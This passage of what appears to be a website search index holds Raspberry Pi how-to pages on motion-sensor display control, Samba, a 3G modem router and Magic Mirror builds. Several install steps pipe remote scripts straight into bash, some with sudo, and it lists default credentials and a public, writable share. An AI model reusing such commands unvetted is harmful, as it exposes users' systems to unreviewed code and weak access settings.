on display for 60 sec Motion while display is on Resets the timer for another 60 sec No motion > 60 sec Turns off the display Config \u00b6 File /usr/local/bin/motion-display-control.py You can change Data Pin of the PIR Sensor at gpio_pin value You can change Delay at display_delay value Line motion = Motion ( gpio_pin = 4 , display_delay = 60 , verbose = False ) Restart the service to apply changes sudo systemctl restart power_button.service Debug \u00b6 In order to allow verbose debug change the following File /usr/local/bin/motion-display-control.py Line Set verbose value to True motion = Motion ( gpio_pin = 4 , display_delay = 60 , verbose = True ) Restart the service to apply changes sudo systemctl restart motion-display-control.service Check if service is running \u00b6 sudo systemctl status power_button.service Contributors \u00b6 Thanks to Boris Berman for the script rewrite from function to classes", "title": "Motion Sensor Display Control"}, {"location": "raspberry-pi/motion-sensor-display-control/#motion-sensor-display-control", "text": "Python script to control connected display to Raspberry Pi using Motion Sensor (pir). Official Github Repo", "title": "Motion Sensor Display Control"}, {"location": "raspberry-pi/motion-sensor-display-control/#information", "text": "This script uses pin GPIO4(7) to read data from Motion (PIR) Sensor, Any 5v and ground for PIR Sensor", "title": "Information"}, {"location": "raspberry-pi/motion-sensor-display-control/#requirements", "text": "python3-gpiozero Can be install via apt sudo apt install python3-gpiozero", "title": "Requirements"}, {"location": "raspberry-pi/motion-sensor-display-control/#install", "text": "This will install the script as service and it will run at boot curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/install.sh | bash", "title": "Install"}, {"location": "raspberry-pi/motion-sensor-display-control/#uninstall", "text": "curl https://raw.githubusercontent.com/fire1ce/raspberry-pi-pir-motion-display-control/main/uninstall.sh | bash", "title": "Uninstall"}, {"location": "raspberry-pi/motion-sensor-display-control/#default-behavior", "text": "Condition Behavior Motion while display is off Turns on display for 60 sec Motion while display is on Resets the timer for another 60 sec No motion > 60 sec Turns off the display", "title": "Default Behavior"}, {"location": "raspberry-pi/motion-sensor-display-control/#config", "text": "File /usr/local/bin/motion-display-control.py You can change Data Pin of the PIR Sensor at gpio_pin value You can change Delay at display_delay value Line motion = Motion ( gpio_pin = 4 , display_delay = 60 , verbose = False ) Restart the service to apply changes sudo systemctl restart power_button.service", "title": "Config"}, {"location": "raspberry-pi/motion-sensor-display-control/#debug", "text": "In order to allow verbose debug change the following File /usr/local/bin/motion-display-control.py Line Set verbose value to True motion = Motion ( gpio_pin = 4 , display_delay = 60 , verbose = True ) Restart the service to apply changes sudo systemctl restart motion-display-control.service", "title": "Debug"}, {"location": "raspberry-pi/motion-sensor-display-control/#check-if-service-is-running", "text": "sudo systemctl status power_button.service", "title": "Check if service is running"}, {"location": "raspberry-pi/motion-sensor-display-control/#contributors", "text": "Thanks to Boris Berman for the script rewrite from function to classes", "title": "Contributors"}, {"location": "raspberry-pi/snippets/", "text": "Snippets \u00b6 Enable SSH on Raspberry Pi Without a Screen \u00b6 Put the micro SD card into your computer You'll have to locate the boot directory at your SD card for example: cd /Volumes/boot All you have to do is create an empty file called ssh. touch ssh That's it. Insert the SD card to the Pi. You should have enabled SSH at boot. Default User and Password After Installation \u00b6 User: pi Password: raspberry Basic Configuration \u00b6 sudo raspi-config Update OS \u00b6 sudo apt-get update && sudo apt-get upgrade -y Disable IPv6 on Raspberry Pi Os \u00b6 Edit \u201c/etc/sysctl.conf\u201d: sudo nano /etc/sysctl.conf Add this to the end: net.ipv6.conf.all.disable_ipv6=1 net.ipv6.conf.default.disable_ipv6=1 net.ipv6.conf.lo.disable_ipv6=1 net.ipv6.conf.eth0.disable_ipv6 = 1 Save and close the file. Edit \u201c/etc/rc.local\u201d: sudo nano /etc/rc.local Add this to the end (but before \u201cexit 0\u201d): service procps reload Save and close the file. Reboot Show Raspberry Temperature \u00b6 /opt/vc/bin/vcgencmd measure_temp Samba for RaspberryPi \u00b6 sudo apt-get update sudo apt-get install -y samba samba-common-bin smbclient cifs-utils sudo smbpasswd -a pi ( my-pi-samba-remote-password ) sudo nano /etc/samba/smb.conf change: workgroup = YOUR WINDOWS WORKGROUP NAME add at end: [ share ] path = /home/pi/Desktop/share available = yes valid users = pi read only = no browsable = yes public = yes writable = yes the shared path must exist: ( if you work via desktop ( HDMI or VNC ) it is very convenient just to read or drop from/to this shared dir ) mkdir /home/pi/Desktop/share sudo reboot Start samba Server sudo /usr/sbin/service smbd start", "title": "Snippets"}, {"location": "raspberry-pi/snippets/#snippets", "text": "", "title": "Snippets"}, {"location": "raspberry-pi/snippets/#enable-ssh-on-raspberry-pi-without-a-screen", "text": "Put the micro SD card into your computer You'll have to locate the boot directory at your SD card for example: cd /Volumes/boot All you have to do is create an empty file called ssh. touch ssh That's it. Insert the SD card to the Pi. You should have enabled SSH at boot.", "title": "Enable SSH on Raspberry Pi Without a Screen"}, {"location": "raspberry-pi/snippets/#default-user-and-password-after-installation", "text": "User: pi Password: raspberry", "title": "Default User and Password After Installation"}, {"location": "raspberry-pi/snippets/#basic-configuration", "text": "sudo raspi-config", "title": "Basic Configuration"}, {"location": "raspberry-pi/snippets/#update-os", "text": "sudo apt-get update && sudo apt-get upgrade -y", "title": "Update OS"}, {"location": "raspberry-pi/snippets/#disable-ipv6-on-raspberry-pi-os", "text": "Edit \u201c/etc/sysctl.conf\u201d: sudo nano /etc/sysctl.conf Add this to the end: net.ipv6.conf.all.disable_ipv6=1 net.ipv6.conf.default.disable_ipv6=1 net.ipv6.conf.lo.disable_ipv6=1 net.ipv6.conf.eth0.disable_ipv6 = 1 Save and close the file. Edit \u201c/etc/rc.local\u201d: sudo nano /etc/rc.local Add this to the end (but before \u201cexit 0\u201d): service procps reload Save and close the file. Reboot", "title": "Disable IPv6 on Raspberry Pi Os"}, {"location": "raspberry-pi/snippets/#show-raspberry-temperature", "text": "/opt/vc/bin/vcgencmd measure_temp", "title": "Show Raspberry Temperature"}, {"location": "raspberry-pi/snippets/#samba-for-raspberrypi", "text": "sudo apt-get update sudo apt-get install -y samba samba-common-bin smbclient cifs-utils sudo smbpasswd -a pi ( my-pi-samba-remote-password ) sudo nano /etc/samba/smb.conf change: workgroup = YOUR WINDOWS WORKGROUP NAME add at end: [ share ] path = /home/pi/Desktop/share available = yes valid users = pi read only = no browsable = yes public = yes writable = yes the shared path must exist: ( if you work via desktop ( HDMI or VNC ) it is very convenient just to read or drop from/to this shared dir ) mkdir /home/pi/Desktop/share sudo reboot Start samba Server sudo /usr/sbin/service smbd start", "title": "Samba for RaspberryPi"}, {"location": "raspberry-pi/guides/3g-modem-host/", "text": "3g Modem Host Configuration \u00b6 Install ubuntu server for raspberrypi using Raspberry Pi Imager {} Packages Installation \u00b6 apt install -y ppp curl wget git dnsutils whois net-tools htop gcc libusb-1.0-0-dev iptables-persistent isc-dhcp-server After the install add a symlink ln -s /usr/include/libusb-1.0/libusb.h /usr/include/libusb.h sakis3g Script Installation \u00b6 Clone, Compile, and copy to /usr/bin/ git clone https://github.com/Trixarian/sakis3g-source.git cd sakis3g-source ./compile cp build/sakis3gz /usr/bin/sakis3g Create new script for auto connect nano /usr/bin/sakis3gConnect.sh Note interactive connect (for testing) sakis3g --interactive Copy the following #!/bin/bash /usr/bin/sakis3g start USBINTERFACE = \"5\" APN = \"vob3g\" APN_USER = \" \" APN_PASS = \" \" Note When APN credentials are epmpy, APN_USER and APN_PASS should be a string with a space Add executable permissions chmod +x sakis3gConnect.sh Run the script sakis3gConnect.sh You should have a new interface ppp0 Configuring DHCP Server \u00b6 !! info The following configuration assumes use of eth0 interface for the DHCP Edit nano /etc/default/isc-dhcp-server Add the following to the end of the config INTERFACESv4 = \"eth0\" INTERFACESv6 = \"eth0\" Edit nano /etc/dhcp/dhcpd.conf Change the following options to (you can choose the name servers you use): option domain-name \"local\" ; option domain-name-servers 8 .8.8.8 ; default-lease-time 600 ; max-lease-time 7200 ; ddns-update-style none ; authoritative ; Append the DHCP Network config to the end of the file (Change for your need): subnet 192 .168.20.0 netmask 255 .255.255.0 { range 192 .168.20.5 192 .168.20.30 ; option routers 192 .168.20.1 ; option domain-name-servers 8 .8.8.8, 8 .8.4.4 ; } Save & Exit run echo 1 > /proc/sys/net/ipv4/ip_forward Edit nano /etc/sysctl.conf Change the following option net.ipv4.ip_forward = 1 Restart and Test service isc-dhcp-server restart service isc-dhcp-server status Configure static ip for the th0 Interface & DHCP \u00b6 edit: /etc/netplan/50-cloud-init.yaml network: ethernets: eth0: addresses: [ 192 .168.20.1/24 ] gateway4: 192 .168.20.1 nameservers: addresses: [ 1 .1.1.1, 8 .8.8.8 ] version: 2 After reboot you should connet to the new static ip Lets route all the trafic to new interface with Iptables \u00b6 iptables -F iptables --table nat --append POSTROUTING --out-interface ppp0 -j MASQUERADE iptables --append FORWARD --in-interface eth0 -j ACCEPT Save the rules iptables-save > /etc/iptables/rules.v4 ip6tables-save > /etc/iptables/rules.v6 Cron examples \u00b6 @reboot sleep 20 && /usr/bin/sakis3gConnect.sh */5 * * * * /usr/bin/sakis3gConnect.sh", "title": "3g Modem Host Configuration"}, {"location": "raspberry-pi/guides/3g-modem-host/#3g-modem-host-configuration", "text": "Install ubuntu server for raspberrypi using Raspberry Pi Imager {}", "title": "3g Modem Host Configuration"}, {"location": "raspberry-pi/guides/3g-modem-host/#packages-installation", "text": "apt install -y ppp curl wget git dnsutils whois net-tools htop gcc libusb-1.0-0-dev iptables-persistent isc-dhcp-server After the install add a symlink ln -s /usr/include/libusb-1.0/libusb.h /usr/include/libusb.h", "title": "Packages Installation"}, {"location": "raspberry-pi/guides/3g-modem-host/#sakis3g-script-installation", "text": "Clone, Compile, and copy to /usr/bin/ git clone https://github.com/Trixarian/sakis3g-source.git cd sakis3g-source ./compile cp build/sakis3gz /usr/bin/sakis3g Create new script for auto connect nano /usr/bin/sakis3gConnect.sh Note interactive connect (for testing) sakis3g --interactive Copy the following #!/bin/bash /usr/bin/sakis3g start USBINTERFACE = \"5\" APN = \"vob3g\" APN_USER = \" \" APN_PASS = \" \" Note When APN credentials are epmpy, APN_USER and APN_PASS should be a string with a space Add executable permissions chmod +x sakis3gConnect.sh Run the script sakis3gConnect.sh You should have a new interface ppp0", "title": "sakis3g Script Installation"}, {"location": "raspberry-pi/guides/3g-modem-host/#configuring-dhcp-server", "text": "!! info The following configuration assumes use of eth0 interface for the DHCP Edit nano /etc/default/isc-dhcp-server Add the following to the end of the config INTERFACESv4 = \"eth0\" INTERFACESv6 = \"eth0\" Edit nano /etc/dhcp/dhcpd.conf Change the following options to (you can choose the name servers you use): option domain-name \"local\" ; option domain-name-servers 8 .8.8.8 ; default-lease-time 600 ; max-lease-time 7200 ; ddns-update-style none ; authoritative ; Append the DHCP Network config to the end of the file (Change for your need): subnet 192 .168.20.0 netmask 255 .255.255.0 { range 192 .168.20.5 192 .168.20.30 ; option routers 192 .168.20.1 ; option domain-name-servers 8 .8.8.8, 8 .8.4.4 ; } Save & Exit run echo 1 > /proc/sys/net/ipv4/ip_forward Edit nano /etc/sysctl.conf Change the following option net.ipv4.ip_forward = 1 Restart and Test service isc-dhcp-server restart service isc-dhcp-server status", "title": "Configuring DHCP Server"}, {"location": "raspberry-pi/guides/3g-modem-host/#configure-static-ip-for-the-th0-interface-dhcp", "text": "edit: /etc/netplan/50-cloud-init.yaml network: ethernets: eth0: addresses: [ 192 .168.20.1/24 ] gateway4: 192 .168.20.1 nameservers: addresses: [ 1 .1.1.1, 8 .8.8.8 ] version: 2 After reboot you should connet to the new static ip", "title": "Configure static ip for the th0 Interface &amp; DHCP"}, {"location": "raspberry-pi/guides/3g-modem-host/#lets-route-all-the-trafic-to-new-interface-with-iptables", "text": "iptables -F iptables --table nat --append POSTROUTING --out-interface ppp0 -j MASQUERADE iptables --append FORWARD --in-interface eth0 -j ACCEPT Save the rules iptables-save > /etc/iptables/rules.v4 ip6tables-save > /etc/iptables/rules.v6", "title": "Lets route all the trafic to new interface with Iptables"}, {"location": "raspberry-pi/guides/3g-modem-host/#cron-examples", "text": "@reboot sleep 20 && /usr/bin/sakis3gConnect.sh */5 * * * * /usr/bin/sakis3gConnect.sh", "title": "Cron examples"}, {"location": "raspberry-pi/projects/magic-mirror-v2/", "tags": ["raspberry-pi", "magicmirror"], "text": "Magic Mirror 2.0 \u00b6 To be honest, it's not my first time building a Magic Mirror project. My first magicmirror can be found here . The Magic Mirror 2.0 is based on Raspberry Pi 4 with Docker Container. References \u00b6 magicmirror.builders official website. khassel's magicmirror docker image documentation website. The Build Process \u00b6 I had dead iMac 2011 27\" with 2k display. I've managed to use it's LCD panel with this product from AliExpress. It actually a full controller for the specific LCD panel, including the inverter for backlight. Basically, it's a full-fledged LCD Monitor with HDMI we need for the Raspberry Pi 4 . I've decided to test the controller for the LCD Panel inside the original iMac's body. I've connected raspberry to the new monitor for the magicmirror testing and configuration. Since my previous experience with my first magicmirror build, I've decided to add a Motion Sensor to the Raspberry Pi to detect the movement of the person infront of the mirror and turn the display on/off accordingly. The second thing i've added is a Power Button to turn the Raspberry Pi on, off and restart it without a physical access to the Raspberry Pi. I couldn't find any open source projects for the functionality I needed of the power button and the Motion Sensor. So I've decided to create my own solution. Bellow are the scripts that I've created: External Power Button Wake/Power Off/Restart Motion Sensor Display Control Thats how i've tested the functionality of the power button and the motion sensor. I've order a reflective glass with 4 holes for mounting. It was a challenge to find a suitable reflective glass for the MagicMirror. The product I've found is not perfect - the glass is tinted, but it's a good enough solution and way better then Glass Mirror Films I've used on my first Magic Mirror Project. After I've done all the proof of concepts that every thing will work as i intended, I've continue to build the frame to house all the components. I've used scrap wood I had laying around to build the frame and the mounting for the LCD panel, and the glass For mounting the Magic Mirror to the wall i've used the smallest TV Mount I've found. After the frame is built, I've added the electronics to the frame. Performing senity check on the electronics, and display assembly. Since I when on the floating effect the glass isn't covering the all the frame, all the exposed parts of the glass are needed to be covered to avoid light leaking. And the final Magic Mirror on the wall. The Software \u00b6 The magicmiror is based on MagicMirror project. running on docker on Raspberry OS. Below the docker compose file for your reference. version: '3' services: magicmirror: image: karsten13/magicmirror container_name: magicmirror hostname: magicmirror restart: always ports: - 80:8080 volumes: - ./config:/opt/magic_mirror/config - ./modules:/opt/magic_mirror/modules - ./css:/opt/magic_mirror/css - /tmp/.X11-unix:/tmp/.X11-unix - /opt/vc:/opt/vc/:ro - /sys:/sys - /usr/bin/vcgencmd:/usr/bin/vcgencmd - /etc/localtime:/etc/localtime devices: - /dev/vchiq environment: - LD_LIBRARY_PATH=/opt/vc/lib - DISPLAY=unix:0.0 - TZ=Asia/Jerusalem - SET_CONTAINER_TIMEZONE=true - CONTAINER_TIMEZONE=Asia/Jerusalem shm_size: '1024mb' command: - npm - run - start", "title": "Magic Mirror 2.0"}, {"location": "raspberry-pi/projects/magic-mirror-v2/#magic-mirror-20", "text": "To be honest, it's not my first time building a Magic Mirror project. My first magicmirror can be found here . The Magic Mirror 2.0 is based on Raspberry Pi 4 with Docker Container.", "title": "Magic Mirror 2.0"}, {"location": "raspberry-pi/projects/magic-mirror-v2/#references", "text": "magicmirror.builders official website. khassel's magicmirror docker image documentation website.", "title": "References"}, {"location": "raspberry-pi/projects/magic-mirror-v2/#the-build-process", "text": "I had dead iMac 2011 27\" with 2k display. I've managed to use it's LCD panel with this product from AliExpress. It actually a full controller for the specific LCD panel, including the inverter for backlight. Basically, it's a full-fledged LCD Monitor with HDMI we need for the Raspberry Pi 4 . I've decided to test the controller for the LCD Panel inside the original iMac's body. I've connected raspberry to the new monitor for the magicmirror testing and configuration. Since my previous experience with my first magicmirror build, I've decided to add a Motion Sensor to the Raspberry Pi to detect the movement of the person infront of the mirror and turn the display on/off accordingly. The second thing i've added is a Power Button to turn the Raspberry Pi on, off and restart it without a physical access to the Raspberry Pi. I couldn't find any open source projects for the functionality I needed of the power button and the Motion Sensor. So I've decided to create my own solution. Bellow are the scripts that I've created: External Power Button Wake/Power Off/Restart Motion Sensor Display Control Thats how i've tested the functionality of the power button and the motion sensor. I've order a reflective glass with 4 holes for mounting. It was a challenge to find a suitable reflective glass for the MagicMirror. The product I've found is not perfect - the glass is tinted, but it's a good enough solution and way better then Glass Mirror Films I've used on my first Magic Mirror Project. After I've done all the proof of concepts that every thing will work as i intended, I've continue to build the frame to house all the components. I've used scrap wood I had laying around to build the frame and the mounting for the LCD panel, and the glass For mounting the Magic Mirror to the wall i've used the smallest TV Mount I've found. After the frame is built, I've added the electronics to the frame. Performing senity check on the electronics, and display assembly. Since I when on the floating effect the glass isn't covering the all the frame, all the exposed parts of the glass are needed to be covered to avoid light leaking. And the final Magic Mirror on the wall.", "title": "The Build Process"}, {"location": "raspberry-pi/projects/magic-mirror-v2/#the-software", "text": "The magicmiror is based on MagicMirror project. running on docker on Raspberry OS. Below the docker compose file for your reference. version: '3' services: magicmirror: image: karsten13/magicmirror container_name: magicmirror hostname: magicmirror restart: always ports: - 80:8080 volumes: - ./config:/opt/magic_mirror/config - ./modules:/opt/magic_mirror/modules - ./css:/opt/magic_mirror/css - /tmp/.X11-unix:/tmp/.X11-unix - /opt/vc:/opt/vc/:ro - /sys:/sys - /usr/bin/vcgencmd:/usr/bin/vcgencmd - /etc/localtime:/etc/localtime devices: - /dev/vchiq environment: - LD_LIBRARY_PATH=/opt/vc/lib - DISPLAY=unix:0.0 - TZ=Asia/Jerusalem - SET_CONTAINER_TIMEZONE=true - CONTAINER_TIMEZONE=Asia/Jerusalem shm_size: '1024mb' command: - npm - run - start", "title": "The Software"}, {"location": "raspberry-pi/projects/magic-mirror/", "text": "Magic Mirror \u00b6 Magic Mirror Build Pictures \u00b6 23\" Samsung screen power resoldering: Wooden frame initial fitting test on a glass with duel mirror film applied: Testing the screen installation (frame removed) with power cords: Testing black&white picture from a laptop after frame assembly: Power, Lan, Usb external ports cutouts: Fitted extended ports with wood filler: Extended ports: Assembly With screen, Raspberry Pi, cable routing, black material which do not pass light where there is no screen: Adding some color for the frame: Testing everything is working as it should be: Full assembly behind the mirror: Final Product: Configuration Setup \u00b6 Change Display Rotation \u00b6 sudo nano /boot/config.txt Add one of those according to your setup to the config file: Code Description display_rotate=0 Normal display_rotate=1 90 degrees display_rotate=2 180 degrees display_rotate=3 270 degrees display_rotate=0x8000 horizontal flip display_rotate=0x20000 vertical flip NOTE: You can rotate both the image and touch interface 180\u00ba by entering lcd_rotate=2 instead Disabling the Screensaver \u00b6 Change to OPEN GL Driver sudo nano /boot/config.txt add this: dtoverlay = vc4-fkms-v3d (Please note, you will need the x11-xserver-utils package installed.) edit ~/.config/lxsession/LXDE-pi/autostart: sudo nano ~/.config/lxsession/LXDE-pi/autostart Add the following lines: @xset s noblank @xset s off @xset -dpms Edit /etc/lightdm/lightdm.conf: sudo nano /etc/lightdm/lightdm.conf Add the following line below [SeatDefaults] xserver-command = X -s 0 -dpms OS UI Finishes \u00b6 Make the Background Black: Right click the Desktop -> Desktop Preferences and Change: Layout -> no image Colour -> #000000 Hit ok. Right click on the top panel -> Panel Preferences -> Appearance Select Solid Color (With Opacity) make sure Opacity at 0 Disable WiFi Power Save \u00b6 Edit /etc/modprobe.d/8192cu.conf sudo nano /etc/modprobe.d/8192cu.conf Add the following lines # Disable power saving options 8192cu rtw_power_mgnt = 0 rtw_enusbss = 1 rtw_ips_mode = 1 For Raspberry Pi 3 Edit /etc/network/interfaces sudo nano /etc/network/interfaces Add the following line under the wlan0 section allow-hotplug wlan0 iface wlan0 inet manual wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf wireless-power off Reboot your PI sudo reboot Disable Cursor on Startup \u00b6 sudo apt-get install unclutter Installation \u00b6 first install node.js and npm curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash - sudo apt-get install -y nodejs and then run: sudo npm install -g npm@latest If you need to remove node and npm run this: sudo apt-get remove nodejs nodejs-legacy nodered Installation: magicmirror-installation say no to PM2 auto start - will be install manually To Start from SSH: cd ~/MagicMirror && DISPLAY = :0 npm start pm2 auto start installation \u00b6 sudo npm install -g pm2 cd ~ nano mm.sh add this to mm.sh and save: #!/bin/sh cd ~/MagicMirror DISPLAY = :0 npm start chmod +x mm.sh pm2 start mm.sh pm2 save pm2 startup pm2 commands: pm2 restart mm pm2 stop mm pm2 start mm pm2 log pm2 show mm Logrotate Installation \u00b6 This will Retain for 14 days compress the logs. pm2 install pm2-logrotate pm2 set pm2-logrotate:compress true pm2 set pm2-logrotate:retain 14 pm2 set pm2-logrotate:max_size 10M", "title": "Magic Mirror"}, {"location": "raspberry-pi/projects/magic-mirror/#magic-mirror", "text": "", "title": "Magic Mirror"}, {"location": "raspberry-pi/projects/magic-mirror/#magic-mirror-build-pictures", "text": "23\" Samsung screen power resoldering: Wooden frame initial fitting test on a glass with duel mirror film applied: Testing the screen installation (frame removed) with power cords: Testing black&white picture from a laptop after frame assembly: Power, Lan, Usb external ports cutouts: Fitted extended ports with wood filler: Extended ports: Assembly With screen, Raspberry Pi, cable routing, black material which do not pass light where there is no screen: Adding some color for the frame: Testing everything is working as it should be: Full assembly behind the mirror: Final Product:", "title": "Magic Mirror Build Pictures"}, {"location": "raspberry-pi/projects/magic-mirror/#configuration-setup", "text": "", "title": "Configuration Setup"}, {"location": "raspberry-pi/projects/magic-mirror/#change-display-rotation", "text": "sudo nano /boot/config.txt Add one of those according to your setup to the config file: Code Description display_rotate=0 Normal display_rotate=1 90 degrees display_rotate=2 180 degrees display_rotate=3 270 degrees display_rotate=0x8000 horizontal flip display_rotate=0x20000 vertical flip NOTE: You can rotate both the image and touch interface 180\u00ba by entering lcd_rotate=2 instead", "title": "Change Display Rotation"}, {"location": "raspberry-pi/projects/magic-mirror/#disabling-the-screensaver", "text": "Change to OPEN GL Driver sudo nano /boot/config.txt add this: dtoverlay = vc4-fkms-v3d (Please note, you will need the x11-xserver-utils package installed.) edit ~/.config/lxsession/LXDE-pi/autostart: sudo nano ~/.config/lxsession/LXDE-pi/autostart Add the following lines: @xset s noblank @xset s off @xset -dpms Edit /etc/lightdm/lightdm.conf: sudo nano /etc/lightdm/lightdm.conf Add the following line below [SeatDefaults] xserver-command = X -s 0 -dpms", "title": "Disabling the Screensaver"}, {"location": "raspberry-pi/projects/magic-mirror/#os-ui-finishes", "text": "Make the Background Black: Right click the Desktop -> Desktop Preferences and Change: Layout -> no image Colour -> #000000 Hit ok. Right click on the top panel -> Panel Preferences -> Appearance Select Solid Color (With Opacity) make sure Opacity at 0", "title": "OS UI Finishes"}, {"location": "raspberry-pi/projects/magic-mirror/#disable-wifi-power-save", "text": "Edit /etc/modprobe.d/8192cu.conf sudo nano /etc/modprobe.d/8192cu.conf Add the following lines # Disable power saving options 8192cu rtw_power_mgnt = 0 rtw_enusbss = 1 rtw_ips_mode = 1 For Raspberry Pi 3 Edit /etc/network/interfaces sudo nano /etc/network/interfaces Add the following line under the wlan0 section allow-hotplug wlan0 iface wlan0 inet manual wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf wireless-power off Reboot your PI sudo reboot", "title": "Disable WiFi Power Save"}, {"location": "raspberry-pi/projects/magic-mirror/#disable-cursor-on-startup", "text": "sudo apt-get install unclutter", "title": "Disable Cursor on Startup"}, {"location": "raspberry-pi/projects/magic-mirror/#installation", "text": "first install node.js and npm curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash - sudo apt-get install -y nodejs and then run: sudo npm install -g npm@latest If you need to remove node and npm run this: sudo apt-get remove nodejs nodejs-legacy nodered Installation: magicmirror-installation say no to PM2 auto start - will be install manually To Start from SSH: cd ~/MagicMirror && DISPLAY = :0 npm start", "title": "Installation"}, {"location": "raspberry-pi/projects/magic-mirror/#pm2-auto-start-installation", "text": "sudo npm install -g pm2 cd ~ nano mm.sh add this to mm.sh and save: #!/bin/sh cd ~/MagicMirror DISPLAY = :0 npm start chmod +x mm.sh pm2 start mm.sh pm2 save pm2 startup pm2 commands: pm2 restart mm pm2 stop mm pm2 start mm pm2 log pm2 show mm", "title": "pm2 auto start installation"}, {"location": "raspberry-pi/projects/magic-mirror/#logrotate-installation", "text": "This will Retain for 14 days compress the logs. pm2 install pm2-logrotate pm2 set pm2-logrotate:compress true pm2 set pm2-logrotate:retain 14 pm2 set pm2-logrotate:max_size 10M", "title": "Logrotate Installation"}, {"location": "utilities/htpasswd-generator/", "text": "htpasswd Password Generator \u00b6 This htpasswd password encryption applet is written in JavaScript, so the entire process runs within your browser.Nothing is transmitted to any server, we take your privacy and securityserious. Credit & Sources \u00b6 The code was built by macminiosx and cloned from his repository . It was slightly modified to fit this website.", "title": "htpasswd Password Generator"}, {"location": "utilities/htpasswd-generator/#htpasswd-password-generator", "text": "This htpasswd password encryption applet is written in JavaScript, so the entire process runs within your browser.Nothing is transmitted to any server, we take your privacy and securityserious.", "title": "htpasswd Password Generator"}, {"location": "utilities/htpasswd-generator/#credit-sources", "text": "The code was built by macminiosx and cloned from his repository . It was slightly modified to fit this website.", "title": "Credit &amp; Sources"}, {"location": "utilities/usefulLinks_Tools/", "text": "Useful Links & Tools \u00b6 Services Description Mail-Tester.com Tests the quality of emails ipleak.net Shows Information About Your IP sslLabs.com Test Your SSL Certification ifconfig.io curl ifconfig.io DSL Reports.com Speedtest For QoS Best Configuration Hurricane Electric Free DNS Hosting Free DNS & DDNS Service freedns.afraid.org Free DNS & DDNS Service", "title": "Useful Links & Tools"}, {"location": "utilities/usefulLinks_Tools/#useful-links-tools", "text": "Services Description Mail-Tester.com Tests the quality of emails ipleak.net Shows Information About Your IP sslLabs.com Test Your SSL Certification ifconfig.io curl ifconfig.io DSL Reports.com Speedtest For QoS Best Configuration Hurricane Electric Free DNS Hosting Free DNS & DDNS Service freedns.afraid.org Free DNS & DDNS Service", "title": "Useful Links &amp; Tools"}, {"location": "utilities/wifiQrGenerator/", "text": "Wifi QR Image Generator \u00b6 Description \u00b6 This will generate a QR code what can be used with any iOS/Android device to access a given Wifi without manually adding a network and password. Just scan the QR Code and you are connected. This is a fully static code - no data is send to any server! Generator \u00b6 Credit & Sources \u00b6 This code was taken from this site qistoph Github Page . It was fully reviewed for any malicious code or functionality and slightly modified to fit this site", "title": "Wifi QR Image Generator"}, {"location": "utilities/wifiQrGenerator/#wifi-qr-image-generator", "text": "", "title": "Wifi QR Image Generator"}, {"location": "utilities/wifiQrGenerator/#description", "text": "This will generate a QR code what can be used with any iOS/Android device to access a given Wifi without manually adding a network and password. Just scan the QR Code and you are connected. This is a fully static code - no data is send to any server!", "title": "Description"}, {"location": "utilities/wifiQrGenerator/#generator", "text": "", "title": "Generator"}, {"location": "utilities/wifiQrGenerator/#credit-sources", "text": "This code was taken from this site qistoph Github Page . It was fully reviewed for any malicious code or functionality and slightly modified to fit this site", "title": "Credit &amp; Sources"}, {"location": "utilities/browsers-extensions/chrome/", "tags": ["chrome", "extensions"], "text": "Chrome Extensions \u00b6 List of extensions for Chrome browser. Chrome Extensions Description 1Password Password Manager (Desktop App Required) Clear Browsing Data Clear Browsing Data HTTPS Everywhere Automatically use HTTPS Pushbullet Connectivity App uBlock Origin Ad Block EditThisCookie Edit cookie per page Wappalyzer Uncovers the technologies used on websites IP Address and Domain Information Find detailed information about each IP address", "title": "Chrome Extensions"}, {"location": "utilities/browsers-extensions/chrome/#chrome-extensions", "text": "List of extensions for Chrome browser. Chrome Extensions Description 1Password Password Manager (Desktop App Required) Clear Browsing Data Clear Browsing Data HTTPS Everywhere Automatically use HTTPS Pushbullet Connectivity App uBlock Origin Ad Block EditThisCookie Edit cookie per page Wappalyzer Uncovers the technologies used on websites IP Address and Domain Information Find detailed information about each IP address", "title": "Chrome Extensions"}, {"location": "utilities/browsers-extensions/firefox/", "tags": ["firefox", "extensions"], "text": "Firefox Extensions \u00b6 List of extensions for Firefox browser. Firefox Extensions Description FoxyProxy Proxy Management Wappalyzer Identifies software on websites Clear Browsing Data Delete browsing data 1Password Password Manager", "title": "Firefox Extensions"}, {"location": "utilities/browsers-extensions/firefox/#firefox-extensions", "text": "List of extensions for Firefox browser. Firefox Extensions Description FoxyProxy Proxy Management Wappalyzer Identifies software on websites Clear Browsing Data Delete browsing data 1Password Password Manager", "title": "Firefox Extensions"}, {"location": "utilities/markdown-cheatsheet/about/", "tags": ["markdown-cheatsheet", "mkdocs"], "text": "About Markdown \u00b6 Markdown is a lightweight markup language with plain text formatting syntax. It is designed so that it can be converted to HTML and many other formats using a tool by the same name. Markdown is often used to format readme files, for writing messages in online discussion forums, and to create rich text using a plain text editor. As the initial description of Markdown contained ambiguities and unanswered questions, many implementations and extensions of Markdown appeared over the years to answer these issues. This Page is fully written with Markdown Language and converted to HTML Material for MkDocs Markdown \u00b6 This website is built with MkDocs . MkDocs is a static site generator that can be used to generate websites with a clean and simple user interface. It is a free and open source project. Warning Most of the advanced features used to generate this website and the Markdown syntax used from Material Theme for MkDocs and may not apply to other websites.", "title": "About Markdown"}, {"location": "utilities/markdown-cheatsheet/about/#about-markdown", "text": "Markdown is a lightweight markup language with plain text formatting syntax. It is designed so that it can be converted to HTML and many other formats using a tool by the same name. Markdown is often used to format readme files, for writing messages in online discussion forums, and to create rich text using a plain text editor. As the initial description of Markdown contained ambiguities and unanswered questions, many implementations and extensions of Markdown appeared over the years to answer these issues. This Page is fully written with Markdown Language and converted to HTML", "title": "About Markdown"}, {"location": "utilities/markdown-cheatsheet/about/#material-for-mkdocs-markdown", "text": "This website is built with MkDocs . MkDocs is a static site generator that can be used to generate websites with a clean and simple user interface. It is a free and open source project. Warning Most of the advanced features used to generate this website and the Markdown syntax used from Material Theme for MkDocs and may not apply to other websites.", "title": "Material for MkDocs Markdown"}, {"location": "utilities/markdown-cheatsheet/admonition/", "tags": ["markdown-cheatsheet", "mkdocs", "admonition"], "text": "Markdown Admonitions \u00b6 Admonitions, also known as call-outs , are an excellent choice for including side content without significantly interrupting the document flow. Material for MkDocs provides several different types of admonitions and allows for the inclusion and nesting of arbitrary content. Usage \u00b6 Admonitions follow a simple syntax: a block 